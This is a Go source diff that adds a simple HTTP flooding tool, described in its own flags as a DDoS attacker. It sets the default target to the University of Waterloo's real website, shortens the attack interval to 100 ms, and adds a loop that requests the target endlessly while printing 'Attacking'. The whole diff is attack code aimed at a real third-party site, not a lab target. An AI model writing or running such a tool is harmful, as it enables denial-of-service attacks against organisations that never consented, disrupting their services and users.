@@ -3,6 +3,7 @@ package main
 import (
 	"context"
 	"flag"
+	"io/ioutil"
 	"net"
 	"net/http"
 	"time"
@@ -16,8 +17,8 @@ var (
 
 func init() {
 	flag.StringVar(&method, "method", "GET", "method used to attack target uri")
-	flag.StringVar(&target, "target", "http://news.baidu.com", "target uri for DDoS attack")
-	flag.IntVar(&Interval, "interval", 1000, "attacking interval in ms")
+	flag.StringVar(&target, "target", "https://uwaterloo.ca/", "target uri for DDoS attack")
+	flag.IntVar(&interval, "interval", 100, "attacking interval in ms")
 }
 
 func httpDial(ctx context.Context, network, addr string) (net.Conn, error) {
@@ -30,5 +31,33 @@ func httpDial(ctx context.Context, network, addr string) (net.Conn, error) {
 }
 
 func newHttpClient() *http.Client {
+	client := &http.Client{
+		Transport: &http.Transport{
+			DialContext: httpDial,
+		},
+	}
+	return client
+}
 
+func attack() {
+	req, _ := http.NewRequest(method, target, nil) //建立一个 request 实体
+	cli := newHttpClient()                         //建立一个 client 实体
+	resp, _ := cli.Do(req)                         //用这个client对象来做request实体
+	defer func() { resp.Body.Close() }()
+	ioutil.ReadAll(resp.Body)
+}
+
+func attackLoop() {
+	for {
+		println("Attacking")
+		attack()
+		time.Sleep(time.Duration(interval) * time.Millisecond)
+	}
+}
+
+func main() {
+	if !flag.Parsed() {
+		flag.Parse()
+	}
+	attackLoop()
 }
